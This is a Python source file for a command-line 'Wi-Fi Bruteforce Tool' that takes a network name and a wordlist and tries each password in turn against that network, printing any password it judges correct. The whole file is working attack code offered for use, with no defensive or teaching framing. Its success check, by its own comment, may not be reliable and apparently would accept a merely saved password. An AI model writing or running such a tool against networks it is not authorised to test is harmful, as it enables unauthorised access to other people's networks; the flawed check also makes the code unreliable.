
import argparse
import wifi
import time

def connect_to_wifi(ssid, password, interface='wlan0'):
    """
    Attempts to connect to a Wi-Fi network with a given password.
    Returns True for success, False for failure.
    """
    cell = None
    try:
        cells = wifi.Cell.all(interface)
        cell = next((c for c in cells if c.ssid == ssid), None)
    except Exception as e:
        print(f"[-] Error scanning for networks: {e}")
        return False

    if not cell:
        print(f"[-] SSID '{ssid}' not found.")
        return False

    print(f"[*] Attempting password: {password}")

    try:
        scheme = wifi.Scheme.for_cell(interface, cell.ssid, cell, password)
        scheme.save()
        scheme.activate()

        # Give it a moment to connect and check status
        time.sleep(5)

        # A simple check for the bound scheme.
        # Note: This is a basic check and might not be 100% reliable
        # depending on the OS and network manager.
        if wifi.Scheme.find(interface, cell.ssid):
             print(f"[+] Password found: {password}")
             return True

    except Exception as e:
        # This will catch connection errors, which are expected for wrong passwords.
        # print(f"[-] Connection failed for password '{password}': {e}")
        return False

    return False


def bruteforce_wifi(ssid, wordlist_file, interface='wlan0'):
    """
    Attempts to find the Wi-Fi password using a wordlist.
    """
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue
                if connect_to_wifi(ssid, password, interface):
                    return password
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_file}")

    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wi-Fi Bruteforce Tool")
    parser.add_argument("ssid", help="The SSID of the Wi-Fi network.")
    parser.add_argument("wordlist", help="Path to the wordlist file.")
    parser.add_argument("-i", "--interface", default="wlan0", help="The wireless interface to use (default: wlan0).")

    args = parser.parse_args()

    found_password = bruteforce_wifi(args.ssid, args.wordlist, args.interface)

    if not found_password:
        print("[-] Password not found in the wordlist.")
